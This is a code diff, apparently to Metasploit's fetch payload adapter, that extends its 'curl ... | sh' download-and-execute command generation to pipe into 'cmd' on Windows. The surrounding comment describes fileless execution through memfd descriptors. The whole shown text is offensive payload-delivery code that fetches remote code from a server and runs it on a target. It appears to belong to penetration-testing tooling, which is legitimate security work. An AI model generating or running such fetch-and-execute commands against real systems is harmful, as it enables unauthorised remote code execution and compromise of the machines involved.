@@ -92,6 +92,7 @@ module Msf::Payload::Adapter::Fetch
         fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected for FETCH_PIPE option')
       end
       @pipe_cmd = generate_fetch_commands
+      @pipe_cmd << "\n" if windows? #need CR when we pipe command in Windows
       vprint_status("Command served: #{@pipe_cmd}")
       cmd = generate_pipe_command
     else
@@ -265,7 +266,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    cmd + _execute_add(get_file_cmd)
+    _execute_add(get_file_cmd)
   end
 
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
@@ -314,13 +315,15 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _generate_curl_pipe
+    execute_cmd = 'sh'
+    execute_cmd = 'cmd' if windows?
     case fetch_protocol
     when 'HTTP'
-      return "curl -s http://#{_download_pipe} | sh"
+      return "curl -s http://#{_download_pipe} | #{execute_cmd}"
     when 'HTTPS'
-      return "curl -sk https://#{_download_pipe} | sh"
+      return "curl -sk https://#{_download_pipe} | #{execute_cmd}"
     when 'TFTP'
-      return "curl -s tftp://#{_download_pipe} | sh"
+      return "curl -s tftp://#{_download_pipe} | #{execute_cmd}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
